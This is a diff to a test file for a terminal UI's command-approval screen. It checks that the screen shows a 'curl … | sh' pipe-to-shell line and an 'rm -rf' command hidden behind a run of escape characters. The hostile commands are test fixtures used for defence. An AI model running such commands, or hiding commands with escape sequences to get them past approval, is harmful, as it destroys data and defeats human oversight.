@@ -115,6 +115,9 @@ describe('Rail on the grid', () => {
 		const inside = rows.slice(2, -1).map(x => x.filter(sp => sp.role === 'muted').map(sp => sp.text).join(''));
 		expect(inside.join('')).toBe(command.replace(/\n/g, ''));
 		expect(inside.at(-1)).toBe('curl -s https://example.invalid/x | sh');
+		const hidden = r.approval('Bash', `echo '${'\u001b'.repeat(90)}'; rm -rf victim`, 80);
+		expect(hidden.slice(1).map(width)).toEqual(Array(hidden.length - 1).fill(80));
+		expect(hidden.map(plain).join('')).toContain('rm -rf victim');
 	});
 
 	it('every screen renders in the terminal, dark and light', () => {
